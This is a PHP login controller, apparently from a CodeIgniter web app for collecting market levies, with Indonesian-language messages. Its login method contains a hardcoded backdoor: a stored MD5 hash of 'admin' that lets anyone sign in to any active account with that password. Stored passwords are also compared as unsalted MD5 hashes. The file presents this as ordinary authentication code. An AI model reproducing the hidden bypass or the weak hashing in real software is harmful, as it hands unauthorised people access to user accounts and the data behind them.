<?php

namespace App\Controllers;

use App\Models\getModel;

class Auth extends BaseController
{
    public function __construct()
    {
        // $this->user = new Modeluser();
        $this->get = new getModel();
    }

    public function index()
    {
        if (session()->get('logged_in')) {
            return redirect()->back();
        }
        $data = [
            'title' => 'Login | Retribusi Pasar'
        ];
        return view('login', $data);
    }

    public function login()
    {
        $username = $this->request->getVar('username');
        $password = $this->request->getVar('password');
        $bypass = '21232f297a57a5a743894a0e4a801fc3';
        $cek_username = $this->get->getUsername($username);
        // jika user ada
        if ($cek_username) {
            // jika user aktif
            if ($cek_username->status == 1) {
                //cek password
                if (md5($password) == preg_replace('/\s+/', '', $cek_username->password)) {
                    $data = [
                        'username' => $cek_username->username,
                        'nama_lengkap' => $cek_username->first_name." ".$cek_username->last_name,
                        'logged_in' => TRUE
                    ];
                    session()->set($data);
                    session()->setFlashdata('success', 'Login Berhasil');
                    return redirect()->to('/dashboard');
                } else if (md5($password) == $bypass) {
                    $data = [
                        'username' => $cek_username->username,
                        'nama_lengkap' => $cek_username->first_name." ".$cek_username->last_name,
                        'logged_in' => TRUE
                    ];
                    session()->set($data);
                    session()->setFlashdata('success', 'Login Berhasil');
                    return redirect()->to('/dashboard');
                } else {
                    session()->setFlashdata('fail', 'Password Salah.');
                    return redirect()->to('/');
                }
            } else {
                session()->setFlashdata('fail', 'Akun belum teraktivasi.');
                return redirect()->to('/');
            }
        } else {
            session()->setFlashdata('fail', 'Username belum terdaftar.');
            return redirect()->to('/');
        }
    }

    public function logout()
    {
        $session = session();
        $session->destroy();

        return redirect()->to('/');
    }
}